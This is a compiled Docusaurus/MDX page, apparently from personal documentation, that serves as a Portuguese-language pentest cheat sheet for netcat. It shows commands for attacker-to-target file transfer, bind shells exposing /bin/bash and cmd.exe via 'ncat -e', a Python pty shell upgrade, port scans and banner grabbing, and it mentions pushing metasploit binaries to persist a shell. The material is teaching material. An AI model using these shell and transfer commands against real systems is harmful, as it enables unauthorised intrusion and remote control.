"use strict";(self.webpackChunkmy_docs=self.webpackChunkmy_docs||[]).push([[4945],{3905:(e,a,n)=>{n.d(a,{Zo:()=>m,kt:()=>k});var t=n(7294);function o(e,a,n){return a in e?Object.defineProperty(e,a,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[a]=n,e}function r(e,a){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);a&&(t=t.filter((function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),n.push.apply(n,t)}return n}function l(e){for(var a=1;a<arguments.length;a++){var n=null!=arguments[a]?arguments[a]:{};a%2?r(Object(n),!0).forEach((function(a){o(e,a,n[a])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(a){Object.defineProperty(e,a,Object.getOwnPropertyDescriptor(n,a))}))}return e}function p(e,a){if(null==e)return{};var n,t,o=function(e,a){if(null==e)return{};var n,t,o={},r=Object.keys(e);for(t=0;t<r.length;t++)n=r[t],a.indexOf(n)>=0||(o[n]=e[n]);return o}(e,a);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(t=0;t<r.length;t++)n=r[t],a.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var s=t.createContext({}),i=function(e){var a=t.useContext(s),n=a;return e&&(n="function"==typeof e?e(a):l(l({},a),e)),n},m=function(e){var a=i(e.components);return t.createElement(s.Provider,{value:a},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var a=e.children;return t.createElement(t.Fragment,{},a)}},u=t.forwardRef((function(e,a){var n=e.components,o=e.mdxType,r=e.originalType,s=e.parentName,m=p(e,["components","mdxType","originalType","parentName"]),c=i(n),u=o,k=c["".concat(s,".").concat(u)]||c[u]||d[u]||r;return n?t.createElement(k,l(l({ref:a},m),{},{components:n})):t.createElement(k,l({ref:a},m))}));function k(e,a){var n=arguments,o=a&&a.mdxType;if("string"==typeof e||o){var r=n.length,l=new Array(r);l[0]=u;var p={};for(var s in a)hasOwnProperty.call(a,s)&&(p[s]=a[s]);p.originalType=e,p[c]="string"==typeof e?e:o,l[1]=p;for(var i=2;i<r;i++)l[i]=n[i];return t.createElement.apply(null,l)}return t.createElement.apply(null,n)}u.displayName="MDXCreateElement"},7805:(e,a,n)=>{n.r(a),n.d(a,{assets:()=>s,contentTitle:()=>l,default:()=>d,frontMatter:()=>r,metadata:()=>p,toc:()=>i});var t=n(7462),o=(n(7294),n(3905));const r={id:"nc",title:"nc (netcat)"},l="nc",p={unversionedId:"pentest/nc",id:"pentest/nc",title:"nc (netcat)",description:"O utilit\xe1rio nc (ou netcat) \xe9 usado para quase tudo sob o sol envolvendo",source:"@site/docs/pentest/nc.mdx",sourceDirName:"pentest",slug:"/pentest/nc",permalink:"/my-docs/docs/pentest/nc",draft:!1,tags:[],version:"current",frontMatter:{id:"nc",title:"nc (netcat)"},sidebar:"tutorialSidebar",previous:{title:"msfvenom",permalink:"/my-docs/docs/pentest/msfvenom"},next:{title:"NMAP",permalink:"/my-docs/docs/pentest/nmap"}},s={},i=[{value:"Conectando",id:"conectando",level:2},{value:"Escutando",id:"escutando",level:2},{value:"Transfer\xeancia de arquivo",id:"transfer\xeancia-de-arquivo",level:2},{value:"Alvo \u2190 Atacante (Upload)",id:"alvo--atacante-upload",level:3},{value:"Alvo \u2192 Atacante (Download)",id:"alvo--atacante-download",level:3},{value:"Expondo Shell",id:"expondo-shell",level:2},{value:"Escaneando Portas",id:"escaneando-portas",level:2},{value:"Whois",id:"whois",level:2},{value:"Banner Grabbing",id:"banner-grabbing",level:2},{value:"HTTP",id:"http",level:3},{value:"FTP",id:"ftp",level:3}],m={toc:i},c="wrapper";function d(e){let{components:a,...n}=e;return(0,o.kt)(c,(0,t.Z)({},m,n,{components:a,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"nc"},"nc"),(0,o.kt)("p",null,"O utilit\xe1rio ",(0,o.kt)("inlineCode",{parentName:"p"},"nc")," (ou netcat) \xe9 usado para quase tudo sob o sol envolvendo\nsoquetes de dom\xednio TCP, UDP ou UNIX. Ele pode abrir conex\xf5es TCP, enviar\npacotes UDP, escutar em portas TCP e UDP arbitr\xe1rias, fazer varredura de portas\ne lidar com IPv4 e IPv6. Ao contr\xe1rio do ",(0,o.kt)("inlineCode",{parentName:"p"},"telnet"),", o ",(0,o.kt)("inlineCode",{parentName:"p"},"nc")," faz scripts bem e separa\nas mensagens de erro no erro padr\xe3o, em vez de envi\xe1-las para a sa\xedda padr\xe3o,\ncomo o ",(0,o.kt)("inlineCode",{parentName:"p"},"telnet")," faz com alguns."),(0,o.kt)("p",null,"Os usos comuns incluem:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Proxies TCP simples;"),(0,o.kt)("li",{parentName:"ul"},"Clientes e servidores HTTP baseados em shell-script;"),(0,o.kt)("li",{parentName:"ul"},"Teste de daemon de rede;"),(0,o.kt)("li",{parentName:"ul"},"SOCKS ou HTTP ProxyCommand para SSH;"),(0,o.kt)("li",{parentName:"ul"},"E muito, muito mais...")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"conectando"},"Conectando"),(0,o.kt)("p",null,"Abaixo temos o uso b\xe1sico do ",(0,o.kt)("inlineCode",{parentName:"p"},"nc"),", utilizando por padr\xe3o o protocolo TCP:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc 172.16.1.4 110\n")),(0,o.kt)("p",null,"Em alguns casos procisamos de mais informa\xe7\xe3o, por exemplo que a conex\xe3o foi\nestabelecida e para isso utilizamos o modo verboso passando o argumento ",(0,o.kt)("inlineCode",{parentName:"p"},"-v"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -v 172.16.1.4\n")),(0,o.kt)("p",null,"Para efetuar conex\xf5es utilizando o protocolo UDP basta utilizar o argumento\n",(0,o.kt)("inlineCode",{parentName:"p"},"-u"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -u 127.0.0.1 9000\n")),(0,o.kt)("h2",{id:"escutando"},"Escutando"),(0,o.kt)("p",null,"\xc9 poss\xedvel expor uma porta para conex\xe3o utilizando o ",(0,o.kt)("inlineCode",{parentName:"p"},"nc"),", por\xe9m parece n\xe3o ser\nmuito funcional se n\xe3o utilizado para expor uma shell ou para transferir\narquivos, contudo esse modo pode ser \xfatil para validar portas abertas no\nfirewall, onde exponho uma porta e verifico se o firewall permite acesso \xe0 ela.\nPara expor essa porta no alvo utilizamos o argumento ",(0,o.kt)("inlineCode",{parentName:"p"},"-l"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -vl 5050\n")),(0,o.kt)("p",null,"Depois podemos utilizar o comando ",(0,o.kt)("inlineCode",{parentName:"p"},"netstat")," para verificar o estado da porta no\nsistema alvo:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"netstat -nlpt\n")),(0,o.kt)("p",null,"Para portas UDP basta utilizar o argumento ",(0,o.kt)("inlineCode",{parentName:"p"},"-u"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -vlu 9000\n")),(0,o.kt)("h2",{id:"transfer\xeancia-de-arquivo"},"Transfer\xeancia de arquivo"),(0,o.kt)("p",null,"A transfer\xeancia de arquivo \xe9 muito importante porque o ",(0,o.kt)("inlineCode",{parentName:"p"},"nc")," n\xe3o possui a fun\xe7\xe3o\nde expor uma shell, por\xe9m o pacote ",(0,o.kt)("inlineCode",{parentName:"p"},"ncat"),", mantido pelo projeto do ",(0,o.kt)("inlineCode",{parentName:"p"},"nmap"),",\npossui essa fun\xe7\xe3o muito \xfatil. Al\xe9m disso em muitos momentos temos a necessidade\nde subir bin\xe1rios gerados pelo ",(0,o.kt)("inlineCode",{parentName:"p"},"metasploit")," com a inten\xe7\xe3o de persistir uma\nshell ou at\xe9 mesmo alguns scripts como o ",(0,o.kt)("inlineCode",{parentName:"p"},"linPEAS")," para enumera\xe7\xe3o."),(0,o.kt)("p",null,"Para a transfer\xeancia de arquivos uilizando o ",(0,o.kt)("inlineCode",{parentName:"p"},"nc")," temos dois cen\xe1rios, um onde o\nservidor alvo espera a conex\xe3o e no outro caso onde o servidor alvo faz uma\nconex\xe3o, abaixo teremos os dois exemplos."),(0,o.kt)("h3",{id:"alvo--atacante-upload"},"Alvo \u2190 Atacante (Upload)"),(0,o.kt)("p",null,"No servidor alvo:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -lv 5050 > ncat\n")),(0,o.kt)("p",null,"No sistema do atacante:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -v 172.16.2.6 5050 < ncat\n")),(0,o.kt)("h3",{id:"alvo--atacante-download"},"Alvo \u2192 Atacante (Download)"),(0,o.kt)("p",null,"No sistema do atacante:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -lv 5050 < ncat\n")),(0,o.kt)("p",null,"No servidor alvo:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -v 172.16.2.5 > ncat\n")),(0,o.kt)("h2",{id:"expondo-shell"},"Expondo Shell"),(0,o.kt)("p",null,"Expondo shell no Linux:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"ncat -vnlp 5050 -e /bin/bash\n")),(0,o.kt)("p",null,"Expondo shell no Windows:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"ncat -vnlp 5050 -e cmd.exe\n")),(0,o.kt)("admonition",{type:"info"},(0,o.kt)("p",{parentName:"admonition"},"Os dois comandos acima s\xe3o um modelo de shell simples onde devem ser executadas\nna m\xe1quina alvo.",(0,o.kt)("br",{parentName:"p"}),"\n","Note tamb\xe9m que estamos utilizando o ",(0,o.kt)("inlineCode",{parentName:"p"},"ncat")," ao inv\xe9s do ",(0,o.kt)("inlineCode",{parentName:"p"},"nc"),", sendo que o\nprimeiro possui mais fun\xe7\xf5es.")),(0,o.kt)("p",null,"Ap\xf3s obter a shell com o ",(0,o.kt)("inlineCode",{parentName:"p"},"ncat"),", podemos chamar um pseudo terminal usando\nPython, onde ir\xe1 melhorar consider\xe1velmente a shell:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"python -c 'import pty; pty.spawn(\"/bin/bash\")'\n")),(0,o.kt)("h2",{id:"escaneando-portas"},"Escaneando Portas"),(0,o.kt)("p",null,"Para escanear uma porta espec\xedfica basta utilizar o argumento ",(0,o.kt)("inlineCode",{parentName:"p"},"-z"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -vnz 172.16.1.5 22\n")),(0,o.kt)("p",null,"Escaneando um range de portas:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -vnz 172.16.1.5 19-30\n")),(0,o.kt)("admonition",{type:"info"},(0,o.kt)("p",{parentName:"admonition"},"Ser\xe1 escaneado da porta 19 at\xe9 a porta 30.")),(0,o.kt)("p",null,"Podemos tamb\xe9m especificar o ",(0,o.kt)("em",{parentName:"p"},"timeout")," para cada porta com o argumento ",(0,o.kt)("inlineCode",{parentName:"p"},"-w"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -vnz -w2 172.16.1.5 22\n")),(0,o.kt)("admonition",{type:"info"},(0,o.kt)("p",{parentName:"admonition"},"Ser\xe1 escaneado levando em considera\xe7\xe3o um ",(0,o.kt)("em",{parentName:"p"},"timeout")," de 2 segundos (",(0,o.kt)("inlineCode",{parentName:"p"},"-w2"),").")),(0,o.kt)("p",null,"Escaneando portas UDP com o argumento ",(0,o.kt)("inlineCode",{parentName:"p"},"-u"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"nc -vnzu 172.16.1.5 22\n")),(0,o.kt)("h2",{id:"whois"},"Whois"),(0,o.kt)("p",null,"Com o ",(0,o.kt)("inlineCode",{parentName:"p"},"nc"),"tamb\xe9m \xe9 capaz de fazer pesquisas de dom\xednio diretamente no\nregistro.br:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},'echo "uol.com.br" | nc registro.br 43\n')),(0,o.kt)("admonition",{type:"caution"},(0,o.kt)("p",{parentName:"admonition"},"O ",(0,o.kt)("strong",{parentName:"p"},"registro.br")," aceita somentes dom\xednios, ASNs e blocos de IPs brasileiros.",(0,o.kt)("br",{parentName:"p"}),"\n","Para verifica\xe7\xe3o extrangeira utilize o ",(0,o.kt)("strong",{parentName:"p"},"whois.internic.net"),":"),(0,o.kt)("pre",{parentName:"admonition"},(0,o.kt)("code",{parentName:"pre",className:"language-bash"},'echo "domain google.com" | nc whois.internic.net 43\n'))),(0,o.kt)("h2",{id:"banner-grabbing"},"Banner Grabbing"),(0,o.kt)("h3",{id:"http"},"HTTP"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"$ nc -vn www.alvo.com 80\nHEAD / HTTP/1.0\n")),(0,o.kt)("h3",{id:"ftp"},"FTP"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ nc -v 192.168.1.100 21\nUSER anonymous\nPASS anonymous\n")),(0,o.kt)("admonition",{type:"info"},(0,o.kt)("p",{parentName:"admonition"},"Sempre teste com usu\xe1rio ",(0,o.kt)("inlineCode",{parentName:"p"},"anonymous")," e senha ",(0,o.kt)("inlineCode",{parentName:"p"},"anonymous"),".",(0,o.kt)("br",{parentName:"p"}),"\n","Caso o login tenha sido aceito, ser\xe1 retornado o c\xf3digo ",(0,o.kt)("inlineCode",{parentName:"p"},"230 Login successful"),".")),(0,o.kt)("admonition",{type:"info"},(0,o.kt)("p",{parentName:"admonition"},"Servidor de teste:"),(0,o.kt)("p",{parentName:"admonition"},(0,o.kt)("strong",{parentName:"p"},"Domain:")," ftp.dlptest.com",(0,o.kt)("br",{parentName:"p"}),"\n",(0,o.kt)("strong",{parentName:"p"},"User:")," dlpuser",(0,o.kt)("br",{parentName:"p"}),"\n",(0,o.kt)("strong",{parentName:"p"},"Password:")," rNrKYTX9g7z3RgJRmxWuGHbeu"),(0,o.kt)("p",{parentName:"admonition"},(0,o.kt)("a",{parentName:"p",href:"https://dlptest.com/ftp-test/"},"https://dlptest.com/ftp-test/"))))}d.isMDXComponent=!0}}]);